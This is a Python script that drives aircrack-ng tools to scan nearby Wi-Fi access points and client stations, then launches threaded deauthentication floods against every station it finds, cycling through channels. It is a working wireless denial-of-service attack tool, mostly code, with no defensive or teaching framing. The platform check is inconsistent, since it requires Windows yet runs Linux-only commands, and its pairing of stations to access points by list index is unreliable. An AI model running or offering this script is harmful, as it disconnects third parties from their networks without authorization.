import os
import csv
import threading
import sys

# Parameters
IFACE = "wlan0"
airodump_output = "output"
num_packets = 1000

def deauth(BSSID, STATION, IFACE, PACKETS):
	if BSSID == " (not associated) ":
		pass
	else:
		for channel in range(1, 12):
			try:
				print(f"Deauth {STATION} from {BSSID} on channel {channel}...")
				os.system(f"airmon-ng start {IFACE} {channel}")
				os.system(f"aireplay-ng --deauth {PACKETS} -a {BSSID} -c {STATION} {IFACE}")
			except:
				print("Channel incorrect")


if __name__ == "__main__":

	if sys.platform == 'win32':
		# Run shell commands
		os.system(f"airmon-ng check kill && airmon-ng start {IFACE}") # kills processes to enable monitor mode
		os.system(f"airodump-ng -w {airodump_output} --output-format csv {IFACE}") # monitors SSIDs and stations and prints to csv file
		
		# Process csv file
		BSSID = []
		MAC = []
		STATION = []
		with open(f"{airodump_output}-01.csv", mode='r') as file:
			reader = csv.reader(file)
			for row in reader:
				if len(row) > 2:
					MAC.append(row[0])
					BSSID.append(row[5])
				
					
		for i in range(0, len(BSSID)):
			if BSSID[i] == " BSSID":
				BSSID = BSSID[i+1:len(BSSID)]
				break
		
		for i in range(0, len(MAC)):
			if MAC[i] == "Station MAC":
				STATION = MAC[i+1:len(MAC)]
				break
		
		# Perform deauthetication attack
		threads = []
		for i in range(0, len(BSSID)):
			t = threading.Thread(target=deauth, args=(BSSID[i], STATION[i], IFACE, num_packets))
			t.start()
			threads.append(t)
			
		for t in threads:
			t.join()
				
		# Cleanup
		os.system(f"rm -rf {airodump_output}-01.csv") # deletes csv file
		os.system(f"airmon-ng stop {IFACE} && systemctl start NetworkManager") # stop monitor mode and restarts Network-manager

	else:
		os.system('clear')
		print(f'Seu sistema não suporta!!!')
		input()
